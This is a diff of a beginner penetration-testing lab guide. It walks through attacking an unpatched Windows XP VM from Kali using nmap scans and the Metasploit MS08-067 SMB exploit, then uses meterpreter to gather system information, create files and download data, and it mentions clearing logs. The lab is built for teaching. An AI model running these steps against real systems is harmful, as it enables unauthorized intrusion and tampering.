@@ -40,10 +40,10 @@ DEFAULT LOGINS:
 • Kali: root/toor
 
 WHAT YOU’LL NEED FOR THIS EXERCISE:
-• A computer with minimum: 8GB RAM, 6 Core CPU and a HDD of 500GB
-• ISO file of Windows XP SP2 or SP3 without Windows Update MS08_067
-• ISO file of the latest Kali release
-• OracleVirtualbox (free) or VMWare Workstation 12 or higher
+  • A computer with minimum: 8GB RAM, 6 Core CPU and a HDD of 500GB
+  • ISO file of Windows XP SP2 or SP3 without Windows Update MS08_067
+  • ISO file of the latest Kali release
+  • OracleVirtualbox (free) or VMWare Workstation 12 or higher
 
 ******************************************************************************
 NOTE: When using a VM make sure you change your resolution to the highest you can use without having any scroll bars on the
@@ -57,21 +57,39 @@ SETUP:
   b. Kali = 1 CPU/2 Cores, 4GB RAM and 40GB HDD space.
 3. Maximize the GPU memory on both Kali (1GB) and XP (512MB).
   a. Do not use 3D on any of them.
-4. Make sure both VM networks are in NAT so they use the same network range. There is no need to be connected to the Internet
-for this to work.
+4. Make sure both VMs networks are in NAT so they use the same network range. There is no need to be connected to the Internet for this to work.
+
+Additionally, some things need to be changed in Windows XP for these steps to work.
+
+First you need to turn OFF the Firewall…I know what you’re thinking, but it needs to happen. Second you need to turn ON the Audit Logon Event that
+will recognize someone else is in the system. This is off by default and we need it on for training purposes. Also, if an administrator is good at
+their job this would have been turned on.
+
+To turn off the Firewall…
+1. Click: Start > Control Panel > Firewall
+2. Under the General tab select OFF then click OK
+
+To turn on the Audit Logon Event…
+1. Click: Start > Control Panel > Administrative Tools > Local Security Policy
+2. Click: Local Policies > Audit Policy
+3. Select: Audit logon events and select both check boxes
+4. Close and go to Event Viewer
+5. Select: Security and live it open
+6. Return to Kali
+
+Now we’re set. Continue on to Kali VM.
 
 ATTACK:
-Run both Kali and XP VMs.
-
-1. Find your IP address…
+1. Find your Kali IP address…
   a. Type: ifconfig
+    i. Take notes
 
-2. In Kali scan for live-hosts…
-  a. Type: nmap –sn <target>/24
+2. Scan for live-hosts…
+  a. Type: nmap –sn <target_ip >/24
     i. Annotate your findings like IPs and their services running if any
 
 3. Select your target and scan for open ports in stealth mode…
-  a. Type: nmap –sS –Pn <target>
+  a. Type: nmap –sS –Pn <target_ip>
     i. Notice the SMB port service is running…we’ll use it on our attack
 
 4. Open a new terminal and run metasploit…
@@ -80,69 +98,83 @@ Run both Kali and XP VMs.
     i. Have you used the TAB key to autocomplete a command?
   c. Type: set
     i. Look at your options…also use the show options if you cannot find the RHOST
-  d. Type: set RHOST
-    i. To the XP IP address
-  e. Type: run
-    i. Or exploit to start
+  d. Type: set RHOST <target_ip>
+    i. Type set again or show options to see the changes
+  e. Type: run to start
+    i. Or type exploit
 
 ******************************************************************************
 NOTE: You’re in meterpreter, a command shell connecting you to your target.
 ******************************************************************************
 
-1. In meterpreter…
+1. In meterpreter, find out where you’re at this time…
   a. Type: pwd
 
-2. Find information about the target…
+2. Find some information about the target…
   a. Type: sysinfo
     i. Take notes
 
-3. Find network information…
-  a. Type: ipconfig
-
-4. Move back to the root directory…
+3. Go to the root drive (C:\)…
   a. Type: cd \\
-    i. You can also use cd ..
+    i. While in meterpreter you have to use double \\ to move around directories
+    ii. If you were in a DOS shell you can use a single \
 
-5. Verify where you are at…
+4. Verify you’re in c:\…
+  a. Type: pwd
+
+5. Find network information…
+  a. Type: ipconfig
+    i. ipconfig in meterpreter is cleaner than in a DOS shell
+
+******************************************************************************
+NOTE: Meterpreter can use both ipconfig or ifconfig…they work the same.
+******************************************************************************
+
+6. View the directory…
   a. Type: ls
-    i. Or type dir ...it also works
 
-6. Create a folder in the target…
+7. Create a folder in the target…
   a. Type: mkdir whoops
 
-7. Rename the folder…
+8. Go to a shell…
+  a. Type: shell
+
+9. Rename the folder whoops…
   a. Type: ren whoops gothacked
 
-8. Verify it’s there…
+10. Verify the name was changed…
   a. Type: dir
 
-9. Go into that folder…
+11. Go into that folder…
   a. Type: cd gothacked
 
-10. Create a file with text in it…
-  a. Type: execute –f cmd.exe –i –H
-    i. Or type shell
+12. Create a file with text in it…
+  a. Type: shell
+    i. Or if in meterpreter type: execute –f cmd.exe –i –H
   b. Type:  echo “this computer was hacked by me!” > hacked.txt
   c. Type: exit
+    i. You’re back in meterpreter
 
-11. Back in meterpreter verify the file is there…
-  a. Type: ls
-  b. Type: cat hacked.txt
+13.	Verify the file is there…
+  a.	Type: ls or dir
+  b.	Type: cd gothacked
+  c.	Type: cat hacked.txt
 
-12. Download the text file…
+14. Download the text file…
   a. Type: download hacked.txt
 
-13. Background the session…
+15. Background the session…
   a. Type: background
-  i. Take note of the ID number for this session
+    i. Take note of the ID number for this session
 
-14. Verify the file is in YOUR computer…
-  a. Type: ls
+16. Verify the file is in YOUR computer…
+  a. Type: ls or dir
+    i. You can also open a new terminal and check
 
 15. Open a new terminal and edit the file…
   a. Type: nano hacked.txt
   b. In a new line type: don’t forget to smile!
-  c. Comment out the first line using a # sign before the comment
+  c. Type: # (hash tag/pound) in front of the first line to comment it out
   d. Save it: Ctrl+S
   e. Ctrl+X to exit
 
@@ -179,7 +211,7 @@ were curious, the command to clear the logs is:
 NOTE: Continue to the Maintain Persistence Guide
 ******************************************************************************
 
-QUESTIONS:
+EXERCISE QUESTIONS:
 In Linux, folders and files are considered the same thing…files. Do some research and answer the following questions:
 
 1. What does the command (dir) in Windows do? What is the equivalent in Linux?
@@ -242,3 +274,5 @@ one does what?
 What other commands give you similar information?
 
 28. What is banner grabbing? What commands can you use to do this?
+
+29.	What other commands did we use in this guide to get target information?
